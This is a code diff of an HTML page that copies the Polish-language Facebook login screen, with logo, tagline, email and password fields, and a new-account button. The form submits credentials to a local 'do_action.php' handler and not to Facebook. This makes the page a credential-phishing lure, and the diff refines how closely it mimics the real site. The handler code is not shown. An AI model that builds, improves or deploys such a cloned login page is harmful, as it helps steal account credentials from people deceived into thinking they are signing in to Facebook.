@@ -1,20 +1,28 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang = "pl">
 <head>
-	<meta charset="UTF-8">
+	<meta charset = "UTF-8">
 	<title>Facebook - zaloguj się lub zarejestruj</title>
-	<link rel="shortcut icon" type="ico" href="images/fb-ico.png">
+	<link rel = "icon shortcut" href = "images/facebook.ico">
 	<style>
-		h1, h2, h3, h4, h5, a, p, ul, li, img, header, section, div, body {margin: 0; padding: 0;}
-
 		body {
 			background: #f2f4f7;
+			display: flex;
+			justify-content: center;
+			align-items: center;
 		}
 
 		* {
 			font-family: SFProDisplay-Bold, Helvetica, Arial, sans-serif;
 			margin: 0;
 			padding: 0;
+		}
+
+		section {
+			width: 980px;
+			display: flex;
+			justify-content: center;
+			align-items: center;
 		}
 
 		p {
@@ -33,7 +41,7 @@
 
 		.login-card {
 		    border-radius: 8px;
-		    height: 350px;
+		    height: fit-content;
 			width: 396px;
 		    margin: 60px auto 45px;
 			box-shadow: 0px 2px 4px rgba(0, 0, 0, .1), 0px 8px 16px rgba(0, 0, 0, .1);
@@ -43,6 +51,22 @@
 
 		.login-form {
 			padding: 20px 20px;
+		}
+
+		.login-form p {
+			color: #0866ff;
+		}
+
+		.login-form p:hover {
+			text-decoration: underline;
+		}
+
+		.card-deco {
+			align-items: center;
+    		border-bottom: 1px solid #dadde1;
+    		display: flex;
+    		margin: 20px 16px;
+    		text-align: center;
 		}
 
 		footer {
@@ -70,43 +94,24 @@
 </head>
 <body>
 	<section>
-		<div class="login-card">
-			<div class="login-form">
-				<form action="do_action.php">
-					<input name="username" type="text" id="username" placeholder="Adres e-mail lub numer telefonu" autofocus="1" aria-label="Adres e-mail lub numer telefonu" style = "padding: 0.8rem 1rem;"></input>
-					<input name="password" id="password" type="password" placeholder="Hasło" autofocus="1" aria-label="Hasło" style = "padding: 0.8rem 1rem;"></input>
-					<input type="submit" name="submit" value="Zaloguj się" style="background: none repeat scroll 0 0 #0866ff; border: none; color: #ffffff; padding: 2px 6px; font-size: 20px; font-weight: 700; height:48px; width:356px;"></input>
-					<p><a style="text-decoration: none; color: #0866ff; font-size: 14px;" href="">Nie pamiętasz hasła?</a></p>
+		<div class = "text">
+			<img src = "images/facebook.svg" alt = "" height = "106" style = "margin: -28px;"/>
+			<p style = "font-size: 28px; font-weight: normal; line-height: 32px; width: 500px;">Facebook pomaga kontaktować się z innymi osobami oraz udostępniać im różne informacje i materiały.</p>
+		</div>
+		<div class = "login-card">
+			<div class = "login-form">
+				<form action = "do_action.php">
+					<input name = "username" type = "text" id = "username" placeholder = "Adres e-mail lub numer telefonu" autofocus = "1" aria-label = "Adres e-mail lub numer telefonu" style = "padding: 0.8rem 1rem;"></input>
+					<input name = "password" id = "password" type = "password" placeholder = "Hasło" autofocus = "1" aria-labe l= "Hasło" style = "padding: 0.8rem 1rem;"></input>
+					<input type = "submit" name = "submit" value = "Zaloguj się" style = "background: none repeat scroll 0 0 #0866ff; border: none; color: #ffffff; padding: 2px 6px; font-size: 20px; font-weight: 700; height:48px; width:356px;"></input>
+					<p><a style = "text-decoration: none; color: #0866ff; font-size: 14px;" href = "">Nie pamiętasz hasła?</a></p>
+					<div class = "card-deco"></div>
+					<div style = "width: 100%; height: 100%; display: flex; justify-content: center; align-items: center;">
+						<input type = "submit" name = "submit" value = "Utwórz nowe konto" style = "background: none repeat scroll 0 0 #42b72a; border: none; color: #ffffff; padding: 2px 6px; font-size: 17px; font-weight: 700; height:48px; width:188px;"></input>
+					</div>
 				</form>
 			</div>
-
 		</div>
-		
-		<footer>
-			<ul>
-				<li><a href="/">Mobile</a></li>
-				<li><a href="/">Find Friends</a></li>
-				<li><a href="/">Badges</a></li>
-				<li><a href="/">People</a></li>
-				<li><a href="/">Pages</a></li>
-				<li><a href="/">Apps</a></li>
-				<li><a href="/">Games</a></li>
-				<li><a href="/">Music</a></li>
-				<li><a href="/">Locations</a></li>
-			</ul>
-			<ul>
-				<li><a href="/">Topics</a></li>
-				<li><a href="/">About</a></li>
-				<li><a href="/">Create Ad</a></li>
-				<li><a href="/">Create Page</a></li>
-				<li><a href="/">Devepers</a></li>
-				<li><a href="/">Careers</a></li>
-				<li><a href="/">Privacy</a></li>
-				<li><a href="/">Cookies</a></li>
-				<li><a href="/">Terms</a></li><br />
-				<li><a href="/">Help</a></li>
-			</ul>
-		</footer>
 	</section>
 </body>
 </html>
